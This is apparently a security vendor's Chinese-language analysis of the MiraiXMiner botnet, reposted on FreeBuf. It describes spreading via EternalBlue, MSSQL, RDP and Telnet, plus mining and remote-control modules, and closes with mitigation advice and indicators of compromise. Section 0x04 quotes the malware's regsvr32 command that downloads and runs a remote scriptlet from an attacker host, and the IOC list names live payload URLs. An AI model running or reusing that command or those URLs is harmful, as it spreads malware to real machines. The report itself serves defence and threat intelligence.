**近日，深信服安全团队跟踪到一新型的物联网僵尸网络，其融合了多种已知病毒家族的特点，包括Mirai物联网僵尸网络病毒、MyKings僵尸网络病毒、远控木马、挖矿等，传播方式包括永恒之蓝漏洞、闭路电视物联网设备漏洞、MSSQL漏洞、RDP爆破和Telnet爆破等。**

深信服已将其命名为MiraiXMiner，并且制定了完善的防御措施。

##  **0x01** **攻击流程**

![1.png](https://image.3001.net/images/20181205/1543989723_5c0769dbc74ce.png!small)

1.病毒母体msinfo.exe通过注册服务&写入恶意代码到数据库的手段，实现持久化攻击。

2.根据C&C命令从云端下载任意的攻击模块，此次的攻击模块为csrs.exe。

3.添加恶意特权账户admin$。

4.从黑客服务器下载三个子模块：后门模块、DNS劫持模块、净化&下载挖矿模块。

5.后门模块up.rar经过分析发现为有名的BootKit远控木马。

6.u.exe通过篡改DNS配置文件达到劫持DNS的目的。

7.净化模块upsnew2.exe的功能很多，除了杀死同行病毒，添加自启动项以外，还会停止Windows自动更新服务，以更稳定地控制受害主机。最重要的，该模块后续还会不定期下载并执行挖矿程序。

8.使用扫描工具和Mirari攻击库对内网设备进行大范围攻击。

9.最后，母体msinfo.exe会连接云端，自动更新病毒，实时下载最新的攻击模块。

##  **0x02** **传播模块**

![2.png](https://image.3001.net/images/20181205/1543989837_5c076a4d07def.png!small)

扫描445端口，如下所示：

![3.png](https://image.3001.net/images/20181205/1543989851_5c076a5bdee08.png!small)

通过内置的masscan程序进行扫描，如下所示：

![4.png](https://image.3001.net/images/20181205/1543989866_5c076a6abe99b.png!small)

通过内置的nmap程序进行扫描行为，如下所示：

![5.png](https://image.3001.net/images/20181205/1543989887_5c076a7fbc17b.png!small)

对扫描到的目标，相应的攻击行为，如下所示：

执行永恒之蓝攻击行为CrackerMS17010，如下所示：

![6.png](https://image.3001.net/images/20181205/1543989898_5c076a8a3ffe2.png!small)

攻击CCTV物联网设备漏洞CrackerCCTV，如下所示：

![7.png](https://image.3001.net/images/20181205/1543989913_5c076a99296a4.png!small)

攻击MSSQL漏洞CrackerMSSQL，如下所示：

![8.png](https://image.3001.net/images/20181205/1543989929_5c076aa903dbe.png!small)

然后执行下面的数据库Payload命令过程，如下所示：

![9.png](https://image.3001.net/images/20181205/1543989943_5c076ab7442d8.png!small)

将如下恶意代码写入数据库存储过程中，如下所示：

![10.png](https://image.3001.net/images/20181205/1543989952_5c076ac0ca093.png!small)

恶意代码如下所示：

对RDP进行攻击CrackerRDP，如下所示：

![11.png](https://image.3001.net/images/20181205/1543989974_5c076ad67c2ce.png!small)

对Telnet进行攻击CrackerTelnet，如下所示：  
![12.png](https://image.3001.net/images/20181205/1543989978_5c076ada6657b.png!small)

## **0x03** **创建** **admin$** **账号**

从服务器上下载相应的配置文件，然后解密，如下所示：

![13.png](https://image.3001.net/images/20181205/1543990043_5c076b1b5d71e.png!small)

然后解密出相应的XML文件，进行下载执行恶意程序操作，如下所示：

![14.png](https://image.3001.net/images/20181205/1543990056_5c076b284945f.png!small)

下载回来的CSRS是一个python脚本编写后生成的EXE，主要是一个Exploit，用于通过MS17010漏洞，添加帐号，如下所示：

![15.png](https://image.3001.net/images/20181205/1543990061_5c076b2d3a0e6.png!small)

添加之后的主机，如下所示：

![16_2.jpg](https://image.3001.net/images/20181205/1543990064_5c076b30d358f.jpg!small)

执行MS17010漏洞攻击，如下所示：

![17.png](https://image.3001.net/images/20181205/1543990069_5c076b3546546.png!small)

攻击的参数，如下所示：

![18.png](https://image.3001.net/images/20181205/1543990073_5c076b3905f5d.png!small)

##  **0x04** **挖矿与远控木马**

下载恶意程序，能过start regsvr32 /s /u /n
/i:<http://up.ms1128.site:8888>\\\s1.txtscrobj.dll，如下所示：

![19.png](https://image.3001.net/images/20181205/1543990077_5c076b3d85a5c.png!small)

解密出上面的XML脚本，如下所示：

![20.png](https://image.3001.net/images/20181205/1543990081_5c076b413798f.png!small)

Upsnew2释放远控木马item.dat以及c3.bat脚本。

c3.bat脚本功能如下：

清除其他病毒。

![21.jpg](https://image.3001.net/images/20181205/1543990085_5c076b45b3413.jpg!small)

开启MSSQLSERVER。

![22.jpg](https://image.3001.net/images/20181205/1543990089_5c076b49aeed2.jpg!small)

在注册表以及任务计划中添加自启动。

![23.jpg](https://image.3001.net/images/20181205/1543990093_5c076b4d80b38.jpg!small)

![24.jpg](https://image.3001.net/images/20181205/1543990097_5c076b5137a06.jpg!small)

关闭自动更新。

![25.jpg](https://image.3001.net/images/20181205/1543990100_5c076b54ecb3f.jpg!small)

加载远控木马。

![26.jpg](https://image.3001.net/images/20181205/1543990104_5c076b58d1006.jpg!small)

配置防火墙策略，关闭135、137、138、139、445端口，防止再被其他病毒感染。

![27.jpg](https://image.3001.net/images/20181205/1543990108_5c076b5c47fad.jpg!small)

##  **0x05** **解决方案**

 **1.隔离感染主机：** 已中毒计算机尽快隔离，关闭所有网络连接，禁用网卡。

 **2.切断传播途径：** 关闭潜在终端的SMB
445等网络共享端口，关闭异常的外联访问。深信服下一代防火墙用户，可开启IPS和僵尸网络功能（需升级到20181204版本），进行封堵。

 **3.查找攻击源：** 借助深信服安全感知平台检测内网攻击源。

 **4.查杀病毒：** 推荐使用深信服终端安全检测响应平台EDR进行查杀，病毒库需升级到20181204版本。

 **5.修补漏洞：** 打上永恒之蓝MS17-010等漏洞相关补丁。

##  **0x06 IOC**

###  **IP：**

45.58.135.106

103.213.246.23

103.95.28.54

74.222.14.97

54.255.141.50

66.117.6.174

118.193.85.90

### URL：

<http://js.mys2018.xyz:280/v.sct>

<http://up.ms1128.site:8888//s1.txt>

<http://208.51.63.150/u.exe>

<http://174.128.239.250/up.rar>

<http://66.117.2.182/upsnew2.exe>

<http://js.ftp0930.host:280/v.sct>

<http://js.mys2018.xyz:280/v.sct>

<http://up.ms1128.site:8888>\\\s1.txt

<http://208.51.63.150/u.exe>

<http://174.128.239.250/up.rar>

<http://66.117.2.182/upsnew2.exe>

<http://45.58.135.106/xpdown.dat>

<http://45.58.135.106/ok/vers.html>

<http://174.128.239.250/kill.txt>

<http://174.128.239.250/up.rar>

<http://223.25.247.240/ok/ups.html>

<http://66.117.6.174/update.txt>

### 域名：

mymyxmra.ru

ok.mymyxmra.ru

### MD5:

a6f1e20930341867bba00ecb540a9847

5506f673eb568897b1db7c06eb4e761a

bc7fc83ce9762eb97dc28ed1b79a0a10

1e822122ee664767d15a3d8aaa3a0734

b89b37a90d0a080c34bbba0d53bd66df

db0e205613407c4e260bcb585270d8cd

***本文作者：千里目安全实验室，转载请注明来自FreeBuf.COM**

